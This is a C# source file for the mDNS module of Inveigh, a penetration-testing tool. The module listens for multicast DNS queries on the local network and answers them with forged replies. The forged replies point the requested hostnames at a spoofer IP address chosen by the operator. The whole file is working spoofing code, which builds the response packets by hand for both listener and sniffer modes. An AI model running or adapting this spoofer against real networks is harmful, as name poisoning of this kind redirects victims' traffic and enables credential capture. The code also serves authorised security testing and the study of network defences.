using System;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class MDNS
    {

        public static void MDNSListener(string ipVersion, string IP)
        {
            byte[] spooferIPData = IPAddress.Parse(Program.argSpooferIP).GetAddressBytes();
            byte[] spooferIPv6Data = IPAddress.Parse(Program.argSpooferIPv6).GetAddressBytes();
            byte[] ttlMDNS = BitConverter.GetBytes(Int32.Parse(Program.argMDNSTTL));
            Array.Reverse(ttlMDNS);
            IPAddress destinationIPAddress = IPAddress.Parse(IP);
            IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Any, 5353);
            UdpClient udpClient = UDP.UDPListener("MDNS", ipVersion, IP, 5353);

            while (!Program.exitInveigh)
            {

                try
                {
                    byte[] udpPayload = udpClient.Receive(ref ipEndPoint);
                    MDNSReply("listener", ipVersion, null, udpPayload, null, destinationIPAddress, ipEndPoint, udpClient);
                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] mDNS spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static void MDNSReply(string method, string ipVersion, byte[] sourcePortData, byte[] payload, IPAddress sourceIPAddress, IPAddress destinationIPAddress, IPEndPoint ipEndPoint, UdpClient udpClient)
        {
            string mdnsResponseMessage = "";
            byte[] mdnsType = new byte[2];
            int sourcePortNumber = 0;
            string responseStatus = "-";

            if (String.Equals(method, "listener"))
            {
                sourcePortNumber = ipEndPoint.Port;
                sourcePortData = Util.IntToByteArray2(sourcePortNumber);
                sourceIPAddress = ipEndPoint.Address;
            }

            string sourceIP = sourceIPAddress.ToString();

            string IP = Program.argIP;

            if (String.Equals(ipVersion, "IPv6"))
            {
                IP = Program.argIPv6;
            }

            if (BitConverter.ToString(payload).EndsWith("-00-01-80-01") && String.Equals(BitConverter.ToString(payload).Substring(12, 23), "00-01-00-00-00-00-00-00"))
            {
                byte[] TTL = BitConverter.GetBytes(Int32.Parse(Program.argMDNSTTL));
                Array.Reverse(TTL);
                byte[] transactionID = new byte[2];
                string requestHostFull = Util.ParseNameQuery(12, payload);
                Buffer.BlockCopy(payload, 0, transactionID, 0, 2);
                byte[] request = new byte[requestHostFull.Length + 2];
                Buffer.BlockCopy(payload, 12, request, 0, request.Length);
                string[] requestSplit = requestHostFull.Split('.');

                if (requestSplit != null && requestSplit.Length > 0)
                {
                    mdnsResponseMessage = Util.CheckRequest("MDNS", requestSplit[0], sourceIP, IP, "QU", Program.argMDNSTypes, Program.enabledMDNS);
                }

                if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                {

                    if (Array.Exists(Program.argMDNSQuestions, element => element == "QU"))
                    {
                        responseStatus = "+";
                        byte[] response = MDNS.GetMDNSResponse(method, ipVersion, sourceIPAddress, destinationIPAddress, sourcePortData, payload);
                        
                        if (String.Equals(method, "sniffer"))
                        {
                            UDP.UDPSnifferClient(ipVersion, 0, sourceIPAddress, sourcePortNumber, response);
                        }
                        else
                        {
                            UDP.UDPListenerClient(sourceIPAddress, sourcePortNumber, udpClient, response);
                        }
                        
                    }
                    else
                    {
                        mdnsResponseMessage = "mDNS type disabled";
                    }

                }

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] (QU)mDNS request for {1} from {2} [{3}]", DateTime.Now.ToString("s"), requestHostFull, sourceIPAddress, mdnsResponseMessage));
                }

            }
            else if (BitConverter.ToString(payload).EndsWith("-00-01") && (String.Equals(BitConverter.ToString(payload).Substring(12, 23), "00-01-00-00-00-00-00-00") ||
                String.Equals(BitConverter.ToString(payload).Substring(12, 23), "00-02-00-00-00-00-00-00")))
            {
                byte[] transactionID = new byte[2];
                Buffer.BlockCopy(payload, 0, transactionID, 0, 2);
                string requestHostFull = Util.ParseNameQuery(12, payload);
                byte[] request = new byte[requestHostFull.Length + 2];
                Buffer.BlockCopy(payload, 12, request, 0, request.Length);
                byte[] type = new byte[2];
                Buffer.BlockCopy(payload, (request.Length + 12), type, 0, 2);
                string typeName = Util.GetRecordType(type);
                string[] requestSplit = requestHostFull.Split('.');

                if (requestSplit != null && requestSplit.Length > 0)
                {
                    mdnsResponseMessage = Util.CheckRequest("MDNS", requestSplit[0], sourceIP, IP, typeName, Program.argMDNSTypes, Program.enabledMDNS);
                }

                if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                {

                    if (Array.Exists(Program.argMDNSQuestions, element => element == "QM"))
                    {
                        responseStatus = "+";
                        byte[] response = MDNS.GetMDNSResponse(method, ipVersion, sourceIPAddress, destinationIPAddress, sourcePortData, payload);

                        if (String.Equals(method, "sniffer"))
                        {
                            UDP.UDPSnifferClient(ipVersion, 5353, IPAddress.Parse("224.0.0.251"), 5353, response);
                        }
                        else
                        {
                            UDP.UDPListenerClient(IPAddress.Parse("224.0.0.251"), 5353, udpClient, response);
                        }

                    }
                    else
                    {
                        mdnsResponseMessage = "QM disabled";
                    }

                }

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[{0}] [{1}] mDNS(QM)({2}) request for {3} from {4} [{5}]", responseStatus, DateTime.Now.ToString("s"), typeName, requestHostFull, sourceIPAddress, mdnsResponseMessage));
                }

            }

        }

        public static byte[] GetMDNSResponse(string method, string ipVersion, IPAddress sourceIPAddress, IPAddress destinationIPAddress, byte[] sourcePortData, byte[] payload)
        {
            byte[] TTL = BitConverter.GetBytes(Int32.Parse(Program.argMDNSTTL));
            Array.Reverse(TTL);
            Array.Reverse(sourcePortData);
            byte[] transactionID = new byte[2];
            Buffer.BlockCopy(payload, 0, transactionID, 0, 2);
            string requestHostFull = Util.ParseNameQuery(12, payload);
            byte[] request = new byte[requestHostFull.Length + 2];
            Buffer.BlockCopy(payload, 12, request, 0, request.Length);
            string IP = Program.argIP;

            if (String.Equals(ipVersion, "IPv6"))
            {
                IP = Program.argIPv6;
            }

            byte[] spooferIPData = Program.spooferIPData; // todo add aaaa
            MemoryStream memoryStream = new MemoryStream();

            if(String.Equals(method, "sniffer"))
            {
                memoryStream.Write((new byte[2] { 0x14, 0xe9 }), 0, 2);
                memoryStream.Write(sourcePortData, 0, 2);
                memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
            }

            memoryStream.Write(transactionID, 0, transactionID.Length);
            memoryStream.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
            memoryStream.Write(request, 0, request.Length);
            memoryStream.Write((new byte[4] { 0x00, 0x01, 0x80, 0x01 }), 0, 4);
            memoryStream.Write(TTL, 0, 4);
            memoryStream.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
            memoryStream.Write(spooferIPData, 0, spooferIPData.Length);

            if (String.Equals(method, "sniffer"))
            {
                memoryStream.Position = 4;
                memoryStream.Write(Util.IntToByteArray2((int)memoryStream.Length), 0, 2);
            }

            return memoryStream.ToArray();
        }

    }

}
